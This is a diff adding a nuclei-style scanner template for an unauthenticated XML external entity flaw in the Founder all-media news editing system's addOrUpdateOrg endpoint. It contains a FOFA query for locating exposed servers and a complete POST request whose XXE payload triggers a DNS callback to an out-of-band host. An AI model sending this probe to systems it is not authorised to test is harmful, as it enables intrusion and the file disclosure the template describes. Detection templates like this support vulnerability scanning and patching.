@@ -1,0 +1,32 @@
+id: fangzheng-addOrUpdateOrg-XXE
+info:
+  name: "方正畅享全媒体新闻采编系统 addOrUpdateOrg 接口 XML 外部实体注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="FOUNDER-全媒体采编系统"
+    方正畅享全媒体新闻采编系统在 addOrUpdateOrg 接口的XML数据处理模块中存在实体解析器配置缺陷。攻击者可通过构造包含恶意外部实体的XML请求，在未认证状态下触发实体扩展过程，实现服务器本地文件读取及敏感信息泄露，可能进一步导致系统权限突破和网络横向渗透。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488027&idx=1&sn=6962fe1d776466e04ac4652b8ee38c1c&chksm=c267a728f5102e3eb48f4fa820dccf89d3d4333c03153a41428b998f728299d66309dbbdd4ab&token=48786214&lang=zh_CN#rd
+  tags: 方正畅享全媒体新闻采编系统
+
+http:
+- raw:
+  - |
+    POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://{{interactsh-url}}%22%3E%20%25remote;%5D%3E
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
+
+
+
+
+
+
